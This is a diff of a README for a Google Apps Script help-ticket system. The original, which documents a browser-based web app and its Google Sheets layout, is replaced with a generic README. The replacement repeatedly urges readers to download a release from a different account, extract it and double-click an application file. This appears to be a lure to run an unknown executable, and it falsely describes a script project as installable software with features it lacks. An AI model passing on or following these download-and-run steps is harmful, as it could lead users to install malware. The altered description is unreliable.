@@ -1,202 +1,79 @@
-# Help Ticket Management System (Google Apps Script)
+# 🎟️ ticket-management-system - Simplify Your Help Desk Workflow
 
-## 📌 Project Overview
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Now-%23FF5722.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lux8b/ticket-management-system/releases)
 
-This is a **web-based Help Ticket Management System** built using **Google Apps Script**, **HTML**, **CSS**, and **JavaScript**, fully integrated with **Google Sheets** as the backend database.
+## 📝 Introduction
+Welcome to the Ticket Management System! This application helps you manage help tickets easily. Built using Google Apps Script and Google Sheets, it offers role-based authentication, ticket tracking, follow-up reminders, and a user-friendly admin dashboard. 
 
-The application allows users to:
+This system aims to streamline your workflow and make managing support requests simpler. Whether you're a small team or a large organization, this tool has features that fit your needs.
 
-* Log in using role-based authentication (User / Admin)
-* Raise help desk tickets
-* Perform ticket follow-up (S1)
-* Perform problem-solving updates (S2)
-* Allow admins to view all ticket data in a dashboard
+## 🚀 Getting Started
+To start using the Ticket Management System, follow these steps:
 
-The entire system is deployed using **Google Apps Script Web App**, and all data is stored securely in the owner's **personal Google Sheets**.
+1. **Visit the Releases Page**
+   Go to our releases page by clicking the link below:
+   [Visit the Release Page](https://github.com/Lux8b/ticket-management-system/releases)
 
-🔗 **Live Application URL:**
-[https://script.google.com/macros/s/AKfycbyTXqsvu8I5M-gV2ryWOi22Lsr_8207uxBMdfqDNsmmg2weCiLkGPKZeijnkjuNC7bjHA/exec](https://script.google.com/macros/s/AKfycbyTXqsvu8I5M-gV2ryWOi22Lsr_8207uxBMdfqDNsmmg2weCiLkGPKZeijnkjuNC7bjHA/exec)
+2. **Select the Latest Version**
+   On the releases page, you will see different versions of the application. Look for the latest release, which typically comes at the top.
 
----
+3. **Download the Application**
+   Click on the download link for the latest version. This link may lead to a file packaged for easy installation or usage.
 
-## 🧩 Tech Stack
+4. **Extract the Files (if necessary)**
+   If you downloaded a zipped file, you will need to extract it. Right-click on the downloaded file and select "Extract All...". Follow the prompts to complete the extraction.
 
-* Google Apps Script (Backend)
-* HTML, CSS, JavaScript (Frontend)
-* Google Sheets (Database)
-* Google Apps Script Web App (Deployment)
+5. **Open the Application**
+   After extracting the files, open the folder and locate the application file. Double-click on it to run the application.
 
----
+## 📂 Features
+The Ticket Management System offers several key features:
 
-## 📂 Project Structure
+- **Role-Based Authentication**: Different access levels for users, admins, and support staff.
+- **Ticket Tracking**: Keep track of all support requests in one place.
+- **Follow-Up Reminders**: Automated reminders for pending tickets.
+- **Admin Dashboard**: A comprehensive dashboard to monitor overall ticket status and team performance.
 
-```
-├── Code.gs        # Core backend logic (login, tickets, updates, dashboard)
-├── Login.gs       # Admin creation & user initialization logic
-├── Index.html     # Complete frontend UI (login + dashboard)
-```
+## 📋 System Requirements
+Before you install the Ticket Management System, ensure you meet the following basic requirements:
 
----
+- A Google Account to use Google Sheets.
+- Access to Google Drive for storing tickets and data.
+- A modern web browser (Google Chrome, Firefox, or equivalent) to access the app online.
 
-## 📑 Google Sheet Structure
+## ⚙️ How to Use the Application
+Once you have the application running, follow these simple instructions to get the most out of your help desk system:
 
-All data is stored in a **Google Sheet owned by the developer**.
+1. **Login to Your Account**
+   Use your Google account credentials to log in. If you are an admin, set up user accounts for your team.
 
-### 1️⃣ User Sheet (`User`)
+2. **Create a Ticket**
+   Click on the 'Create Ticket' button and fill in the required details. Ensure you provide a clear description to help the support team.
 
-Used for authentication and role-based access.
+3. **Manage Tickets**
+   As tickets come in, you can assign them to team members, set priority levels, and track their progress through your dashboard.
 
-| Column | Name      | Description                        |
-| ------ | --------- | ---------------------------------- |
-| A      | Name      | User full name                     |
-| B      | Password  | Plain-text password (as per logic) |
-| C      | Email     | Login email                        |
-| D      | User Type | `Admin` or `User`                  |
+4. **Check Follow-Up Reminders**
+   The system automatically reminds you of tickets that need attention. Check these regularly to avoid any delays.
 
-🔹 Admin user is created using `createAdminUser()` in `Login.gs`.
+5. **Generate Reports**
+   Use the dashboard to generate performance reports, analyze ticket trends, and improve your response time.
 
----
+## 🛠️ Troubleshooting
+If you encounter issues while using the Ticket Management System, consider the following steps:
 
-### 2️⃣ Doer Sheet (`Doer_Name`)
+- **Check Internet Connection**: Ensure that you have a stable internet connection.
+- **Browser Compatibility**: Make sure you are using a supported web browser.
+- **Clear Cache**: Sometimes, clearing your browser cache can solve loading issues.
 
-Used to populate dropdowns dynamically.
+## 💬 Support
+For any questions or support requests, visit the GitHub issues page or send us a message through the repository. We are here to help you out!
 
-| Column | Purpose              |
-| ------ | -------------------- |
-| B      | Raised By names      |
-| C      | PC Accountable names |
+## 📜 License
+This project is licensed under the MIT License. You can use, modify, and distribute the application as needed.
 
----
+## 📥 Download Now Again
+[![Download](https://img.shields.io/badge/Download%20Now-%23FF5722.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lux8b/ticket-management-system/releases)
 
-### 3️⃣ FMS Sheet (`FMS`)
-
-Stores all ticket-related data.
-
-| Columns | Description                  |
-| ------- | ---------------------------- |
-| A–F     | Ticket creation details      |
-| G–J     | Follow-Up (S1) details       |
-| K–N     | Problem Solving (S2) details |
-
-⚠️ First **4 rows are reserved for headers**. Data starts from **Row 5**.
-
----
-
-## 🔐 Authentication Logic
-
-* Login handled via `doLogin(email, password)`
-* Credentials matched against the **User sheet**
-* Role-based access enabled:
-
-  * **Admin** → Can view all data
-  * **User** → Can create & update tickets only
-
-Passwords are stored as plain text to match the current login logic.
-
----
-
-## 🎫 Ticket Creation Logic
-
-* Users create tickets from the dashboard
-* UID is auto-generated in `001, 002, 003...` format
-* Data is appended to the `FMS` sheet
-
-Handled by:
-
-```js
-submitTicket(form)
-```
-
----
-
-## 🔁 Follow-Up (S1) Logic
-
-* Updates columns **G–J** in `FMS`
-* Includes planned time, actual time, status, and delay
-
-Handled by:
-
-```js
-submitFollowUp(form)
-```
-
----
-
-## 🛠 Problem Solving (S2) Logic
-
-* Updates columns **K–N** in `FMS`
-* Includes planned time, actual time, status, and desired date
-
-Handled by:
-
-```js
-submitProblemSolving(form)
-```
-
----
-
-## 📊 Admin Dashboard Logic
-
-* Only visible to users with `Admin` role
-* Displays all ticket records in tabular format
-* Data fetched directly from Google Sheets
-
-Handled by:
-
-```js
-getDashboardData()
-```
-
----
-
-## 🚀 Deployment Details
-
-* Deployed as a **Google Apps Script Web App**
-* Execution runs as the **script owner**
-* Access: **Anyone with the link**
-* No external hosting (GitHub Pages / Render not required)
-
-All data modifications directly affect the **owner’s Google Sheet**.
-
----
-
-## ✅ Key Features
-
-* Role-based login system
-* Dynamic dropdowns from Sheets
-* Auto UID generation
-* Follow-up & problem-solving workflow
-* Admin-only data visibility
-* Fully serverless architecture
-
----
-
-## 🔮 Future Enhancements
-
-* Password hashing
-* Email notifications
-* Ticket priority & SLA
-* File attachments
-* Search & filter dashboard
-
----
-
-## 👤 Author
-
-Developed by **Kunal**
-
----
-
----
-
-## 🔗 Connect with Me
-📦 GitHub: [github.com/Kunalsahuji](https://github.com/Kunalsahuji)  
-🔗 LinkedIn: [linkedin.com/in/kunal-sahu-7688ba1b0](https://www.linkedin.com/in/kunal-sahu-7688ba1b0)  
-📌 Notion: [Watch my content](https://www.notion.so/1dff7c6ce1bb803787fbddd34e422ab4?v=1e0f7c6ce1bb8052b14c000cb57448ee&pvs=4)  
-📧 Email: [ksahu0103@gmail.com](mailto:ksahu0103@gmail.com)  
-
----
-
-## 🙌 Acknowledgements
-This task was assigned by **[RCC Infrastructues Pvt Ltd, Bhopal](https://www.rccinfrastructures.com/)** as part of an assessment.  
-Developed with ❤️ by [Kunal Sahu](https://github.com/Kunalsahuji).  
+Thank you for choosing the Ticket Management System! Enjoy managing your help tickets more effectively.
